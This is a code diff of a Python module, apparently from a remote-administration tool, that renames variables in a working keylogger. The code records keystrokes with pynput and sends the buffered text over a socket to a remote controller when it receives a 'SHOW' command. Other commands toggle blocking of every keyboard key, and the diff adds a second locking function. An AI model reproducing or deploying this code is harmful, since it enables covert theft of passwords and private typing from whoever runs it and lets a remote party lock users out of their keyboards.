@@ -1,30 +1,30 @@
 import threading
 
 import keyboard
-from RD_Constant import BUFFERSIZE
+from RD_Constant import BUFFERSIZE, FORMAT
 from pynput.keyboard import Listener
 
 
 def keylogger(key):
-    global cont, flag
-    if flag == 4:
+    global buffer, cmd_flag
+    if cmd_flag == 4:
         return False
-    if flag == 1:
-        temp = str(key)
-        if temp == "Key.space":
-            temp = " "
-        elif temp == '"\'"':
-            temp = "'"
+    if cmd_flag == 1:
+        tmp = str(key)
+        if tmp == "Key.space":
+            tmp = " "
+        elif tmp == '"\'"':
+            tmp = "'"
         else:
-            temp = temp.replace("'", "")
-        cont += str(temp)
+            tmp = tmp.replace("'", "")
+        buffer += str(tmp)
     return
 
 
 def show(client):
-    global cont
-    client.sendall(bytes(cont, "utf8"))
-    cont = ""
+    global buffer
+    client.sendall(buffer.encode(FORMAT))
+    buffer = ""
     return
 
 
@@ -35,40 +35,50 @@ def listen():
 
 
 def lock():
-    global islock
-    if islock == 0:
+    global lock_flag
+    if lock_flag == 0:
         for i in range(150):
             keyboard.block_key(i)
-        islock = 1
+        lock_flag = 1
     else:
         for i in range(150):
             keyboard.unblock_key(i)
-        islock = 0
+        lock_flag = 0
+    return
+
+def lock_2():
+    global lock_flag
+    for i in range(150):
+        if lock_flag == 0:
+            keyboard.block_key(i)
+        else:
+            keyboard.unblock_key(i)
+    lock_flag = 1
     return
 
 
-def keylog(client):
-    global cont, flag, islock, isbind
-    islock = 0
-    isbind = 0
+def keylog(main_connect):
+    global buffer, cmd_flag, lock_flag, bind_flag
+    lock_flag = 0
+    bind_flag = 0
     threading.Thread(target=listen).start()
-    flag = 0
-    cont = ""
-    message = ""
+    cmd_flag = 0
+    buffer = ""
+    msg = ""
     while True:
-        message = client.recv(BUFFERSIZE).decode("utf8")
-        if "BIND" in message:
-            if isbind == 0:
-                flag = 1
-                isbind = 1
+        msg = main_connect.recv(BUFFERSIZE).decode(FORMAT)
+        if "BIND" in msg:
+            if bind_flag == 0:
+                cmd_flag = 1
+                bind_flag = 1
             else:
-                flag = 2
-                isbind = 0
-        elif "SHOW" in message:
-            show(client)
-        elif "LOCK" in message:
+                cmd_flag = 2
+                bind_flag = 0
+        elif "SHOW" in msg:
+            show(main_connect)
+        elif "LOCK" in msg:
             lock()
-        elif "QUIT" in message:
-            flag = 4
+        elif "QUIT" in msg:
+            cmd_flag = 4
             return
     return
